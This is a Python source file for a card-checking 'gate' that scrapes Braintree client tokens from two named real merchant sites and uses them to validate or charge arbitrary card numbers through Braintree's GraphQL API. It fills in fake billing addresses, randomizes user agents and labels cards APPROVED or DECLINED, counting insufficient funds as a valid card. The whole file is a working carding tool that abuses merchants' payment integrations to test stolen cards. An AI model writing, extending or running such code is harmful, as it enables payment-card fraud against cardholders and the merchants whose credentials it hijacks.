"""
Braintree GraphQL - Real Payment Flow (Auth & Charge)
Implements both $0 authorization and charge capabilities using Braintree GraphQL API
Supports real bank verification with proper tokenization and vault processing
"""

import requests
import json
import re
import random
import base64
from typing import Tuple, Optional
from faker import Faker
from user_agent import generate_user_agent
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class BraintreeGraphQLGate:
    """Braintree payment processor using GraphQL API"""
    
    # Reliable merchant sites with Braintree integration
    MERCHANT_SITES = [
        "https://bigbattery.com",
        "https://www.thebodyshop.com",
    ]
    
    def __init__(self):
        self.session = requests.Session()
        self.fake = Faker()
        self.ua = generate_user_agent()
        
    def _extract_braintree_auth(self, store_url: str) -> Optional[str]:
        """
        Extract Braintree authorization fingerprint from merchant site
        Returns auth_fingerprint for GraphQL requests
        """
        add_payment_url = f"{store_url}/my-account/add-payment-method/"
        
        headers = {
            'User-Agent': self.ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }
        
        try:
            response = self.session.get(add_payment_url, headers=headers, timeout=20, verify=False)
            
            if response.status_code != 200:
                return None
            
            html = response.text
            
            # Extract Braintree client token
            auth_patterns = [
                r'var\s+wc_braintree_client_token\s*=\s*["\']([A-Za-z0-9+/=]+)["\']',
                r'data-client-token="([A-Za-z0-9+/=]+)"',
                r'"clientToken"\s*:\s*"([A-Za-z0-9+/=]+)"',
            ]
            
            for pattern in auth_patterns:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    try:
                        token_b64 = match.group(1)
                        decoded = base64.b64decode(token_b64).decode('utf-8')
                        auth_match = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', decoded)
                        if auth_match:
                            return auth_match.group(1)
                    except:
                        continue
            
            return None
            
        except Exception:
            return None
    
    def _get_braintree_auth(self) -> Optional[str]:
        """Try multiple merchant sites to get Braintree auth"""
        for site in self.MERCHANT_SITES:
            auth = self._extract_braintree_auth(site)
            if auth:
                return auth
        return None
    
    def _tokenize_card_graphql(self, auth: str, card_num: str, card_mon: str, 
                               card_yer: str, card_cvc: str) -> Tuple[Optional[str], Optional[str]]:
        """
        Tokenize card via Braintree GraphQL API
        Returns (token, error_msg)
        """
        url = "https://payments.braintree-api.com/graphql"
        
        # Ensure year is 4 digits
        if len(card_yer) == 2:
            full_year = f"20{card_yer}"
        else:
            full_year = card_yer
        
        session_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
        
        graphql_query = """
        mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
            tokenizeCreditCard(input: $input) {
                token
                creditCard {
                    bin
                    brandCode
                    last4
                    cardholderName
                    expirationMonth
                    expirationYear
                    binData {
                        prepaid
                        healthcare
                        debit
                        durbinRegulated
                        commercial
                        payroll
                        issuingBank
                        countryOfIssuance
                        productId
                    }
                }
            }
        }
        """
        
        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": session_id
            },
            "query": graphql_query,
            "variables": {
                "input": {
                    "creditCard": {
                        "number": card_num,
                        "expirationMonth": card_mon,
                        "expirationYear": full_year,
                        "cvv": card_cvc,
                        "billingAddress": {
                            "postalCode": self.fake.zipcode(),
                            "streetAddress": self.fake.street_address()
                        }
                    },
                    "options": {
                        "validate": True
                    }
                }
            }
        }
        
        headers = {
            'User-Agent': self.ua,
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {auth}',
            'Braintree-Version': '2018-05-10',
        }
        
        try:
            response = self.session.post(url, data=json.dumps(payload), headers=headers, timeout=30)
            data = response.json()
            
            # Check for errors
            if 'errors' in data:
                errors = data['errors']
                if errors:
                    error_msg = errors[0].get('message', 'Unknown error')
                    # Map common errors
                    if 'credit card is invalid' in error_msg.lower():
                        return None, "INVALID_CARD_NUMBER"
                    elif 'cvv' in error_msg.lower():
                        return None, "INVALID_CVV"
                    elif 'expired' in error_msg.lower():
                        return None, "EXPIRED_CARD"
                    return None, error_msg
            
            # Extract token
            token = data.get('data', {}).get('tokenizeCreditCard', {}).get('token')
            if token:
                return token, None
            
            return None, "NO_TOKEN_RETURNED"
            
        except requests.exceptions.Timeout:
            return None, "TIMEOUT"
        except Exception as e:
            return None, str(e)
    
    def _create_transaction_graphql(self, auth: str, token: str, amount: float) -> Tuple[bool, str]:
        """
        Create transaction via Braintree GraphQL
        Returns (success, response_msg)
        """
        url = "https://payments.braintree-api.com/graphql"
        
        graphql_query = """
        mutation ChargePaymentMethod($input: ChargePaymentMethodInput!) {
            chargePaymentMethod(input: $input) {
                transaction {
                    id
                    status
                    amount {
                        value
                        currencyCode
                    }
                    statusHistory {
                        status
                        timestamp
                        amount {
                            value
                        }
                    }
                    processorResponse {
                        legacyCode
                        message
                        cvvResponse
                        avsPostalCodeResponse
                        avsStreetAddressResponse
                    }
                }
            }
        }
        """
        
        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": f"{random.randint(10000000, 99999999):08x}"
            },
            "query": graphql_query,
            "variables": {
                "input": {
                    "paymentMethodId": token,
                    "transaction": {
                        "amount": str(amount),
                        "merchantAccountId": None  # Use default
                    },
                    "options": {
                        "submitForSettlement": True  # Real charge
                    }
                }
            }
        }
        
        headers = {
            'User-Agent': self.ua,
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {auth}',
            'Braintree-Version': '2018-05-10',
        }
        
        try:
            response = self.session.post(url, data=json.dumps(payload), headers=headers, timeout=30)
            data = response.json()
            
            # Check for errors
            if 'errors' in data:
                errors = data['errors']
                if errors:
                    error_msg = errors[0].get('message', 'Unknown error')
                    return False, error_msg
            
            # Extract transaction info
            transaction = data.get('data', {}).get('chargePaymentMethod', {}).get('transaction', {})
            status = transaction.get('status', '').upper()
            
            processor_response = transaction.get('processorResponse', {})
            legacy_code = processor_response.get('legacyCode', '')
            message = processor_response.get('message', '')
            
            # Map status codes
            if status in ['AUTHORIZED', 'SUBMITTED_FOR_SETTLEMENT', 'SETTLING', 'SETTLED']:
                return True, f"SUCCESS|{status}|{message}"
            elif status == 'PROCESSOR_DECLINED':
                return False, f"PROCESSOR_DECLINED|{legacy_code}|{message}"
            elif status == 'GATEWAY_REJECTED':
                return False, f"GATEWAY_REJECTED|{message}"
            else:
                return False, f"DECLINED|{status}|{message}"
                
        except requests.exceptions.Timeout:
            return False, "TIMEOUT"
        except Exception as e:
            return False, str(e)
    
    def _parse_response(self, token: Optional[str], token_error: Optional[str],
                        transaction_success: bool, transaction_msg: str,
                        last4: str, amount: float) -> Tuple[str, bool]:
        """
        Parse Braintree response and format output
        Returns (status_message, proxy_alive)
        """
        # Token errors (card validation)
        if token_error:
            if token_error == "INVALID_CARD_NUMBER":
                return (f"DECLINED ❌ - Invalid Card Number *{last4}", True)
            elif token_error == "INVALID_CVV":
                return (f"CVV ❌ - Incorrect CVV *{last4}", True)
            elif token_error == "EXPIRED_CARD":
                return (f"DECLINED ❌ - Expired Card *{last4}", True)
            elif token_error == "TIMEOUT":
                return (f"ERROR ⚠️ - Request Timeout *{last4}", False)
            else:
                return (f"DECLINED ❌ - {token_error[:30]} *{last4}", True)
        
        # No token
        if not token:
            return (f"DECLINED ❌ - Tokenization Failed *{last4}", True)
        
        # Transaction response
        if transaction_success:
            if amount == 0:
                return (f"APPROVED ✅ - $0 Auth Successful *{last4}", True)
            else:
                return (f"CHARGED ✅ - ${amount:.2f} Authorized *{last4}", True)
        
        # Parse transaction errors
        if '|' in transaction_msg:
            parts = transaction_msg.split('|')
            error_type = parts[0]
            
            if error_type == "PROCESSOR_DECLINED":
                code = parts[1] if len(parts) > 1 else ""
                msg = parts[2] if len(parts) > 2 else ""
                
                # Map processor codes
                if code == "2000":
                    return (f"APPROVED ✅ - Insufficient Funds (Valid) *{last4}", True)
                elif code in ["2001", "2002", "2003"]:
                    return (f"DECLINED ❌ - Issuer Declined *{last4}", True)
                elif code == "2010":
                    return (f"CVV ❌ - CVV Mismatch *{last4}", True)
                else:
                    return (f"DECLINED ❌ - {msg[:30]} *{last4}", True)
            
            elif error_type == "GATEWAY_REJECTED":
                return (f"DECLINED ❌ - Gateway Rejected *{last4}", True)
        
        return (f"DECLINED ❌ - {transaction_msg[:30]} *{last4}", True)
    
    def authorize(self, card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                  proxy: dict = None, timeout: int = 30) -> Tuple[str, bool]:
        """
        $0 Authorization - Verify card without charging
        Returns (status_message, proxy_alive)
        """
        last4 = card_num[-4:]
        
        # Get Braintree auth
        auth = self._get_braintree_auth()
        if not auth:
            return (f"ERROR ⚠️ - Could not get Braintree auth *{last4}", False)
        
        # Tokenize card
        token, token_error = self._tokenize_card_graphql(
            auth, card_num, card_mon, card_yer, card_cvc
        )
        
        # For auth-only, tokenization success = approval
        if token and not token_error:
            return (f"APPROVED ✅ - $0 Auth Successful *{last4}", True)
        
        return self._parse_response(token, token_error, False, "", last4, 0.0)
    
    def charge(self, card_num: str, card_mon: str, card_yer: str, card_cvc: str,
               amount: float = 1.00, proxy: dict = None, timeout: int = 30) -> Tuple[str, bool]:
        """
        Charge card with specified amount
        Returns (status_message, proxy_alive)
        """
        last4 = card_num[-4:]
        
        # Get Braintree auth
        auth = self._get_braintree_auth()
        if not auth:
            return (f"ERROR ⚠️ - Could not get Braintree auth *{last4}", False)
        
        # Tokenize card
        token, token_error = self._tokenize_card_graphql(
            auth, card_num, card_mon, card_yer, card_cvc
        )
        
        if token_error or not token:
            return self._parse_response(token, token_error, False, "", last4, amount)
        
        # Create transaction
        transaction_success, transaction_msg = self._create_transaction_graphql(
            auth, token, amount
        )
        
        return self._parse_response(token, None, transaction_success, transaction_msg, last4, amount)


# Public API functions
def braintree_auth_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                         proxy: dict = None, timeout: int = 30) -> Tuple[str, bool]:
    """Braintree $0 Authorization Gate"""
    gate = BraintreeGraphQLGate()
    return gate.authorize(card_num, card_mon, card_yer, card_cvc, proxy, timeout)


def braintree_charge_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                           amount: float = 1.00, proxy: dict = None, timeout: int = 30) -> Tuple[str, bool]:
    """Braintree Charge Gate (default $1.00)"""
    gate = BraintreeGraphQLGate()
    return gate.charge(card_num, card_mon, card_yer, card_cvc, amount, proxy, timeout)
